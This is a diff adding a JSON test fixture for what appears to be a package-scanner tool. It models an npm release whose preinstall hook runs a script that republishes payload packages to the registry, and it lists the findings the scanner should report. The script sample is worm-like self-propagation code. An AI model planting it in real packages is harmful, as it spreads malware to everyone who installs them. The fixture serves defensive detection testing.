@@ -1,0 +1,60 @@
+{
+  "id": "install-hook-registry-publish",
+  "title": "Preinstall hook republishes the payload to the registry",
+  "category": "install-time-self-propagation",
+  "intent": "Model the worm step that turns one compromised release into many: code a consumer install executes invokes npm publish, so every install can mint new carrier versions. No real credential, no reachable registry.",
+  "previousPackageJson": {
+    "name": "stagelib",
+    "version": "2.3.0"
+  },
+  "stagedPackageJson": {
+    "name": "stagelib",
+    "version": "2.3.1",
+    "scripts": {
+      "preinstall": "node scripts/setup.mjs"
+    }
+  },
+  "previousFiles": [
+    {
+      "path": "package.json",
+      "size": 37,
+      "sha256": "prev-package-json",
+      "flags": [],
+      "textSample": "{\"name\":\"stagelib\",\"version\":\"2.3.0\"}"
+    }
+  ],
+  "stagedFiles": [
+    {
+      "path": "package.json",
+      "size": 87,
+      "sha256": "staged-package-json",
+      "flags": [],
+      "textSample": "{\"name\":\"stagelib\",\"version\":\"2.3.1\",\"scripts\":{\"preinstall\":\"node scripts/setup.mjs\"}}"
+    },
+    {
+      "path": "scripts/setup.mjs",
+      "size": 312,
+      "sha256": "setup-mjs",
+      "flags": [],
+      "textSample": "import { execSync } from 'node:child_process';\nimport { readdirSync } from 'node:fs';\n// Re-publish this payload under every package the install-time credential can reach.\nfor (const candidate of readdirSync('./carriers')) {\n  execSync(`npm publish ./carriers/${candidate} --tag latest`, { stdio: 'ignore' });\n}\n"
+    }
+  ],
+  "expectedRisk": "critical",
+  "expectedFindings": [
+    {
+      "ruleId": "install-script.preinstall",
+      "severity": "critical",
+      "file": "package.json"
+    },
+    {
+      "ruleId": "code.process-execution",
+      "severity": "high",
+      "file": "scripts/setup.mjs"
+    },
+    {
+      "ruleId": "propagation.registry-publish",
+      "severity": "critical",
+      "file": "scripts/setup.mjs"
+    }
+  ]
+}
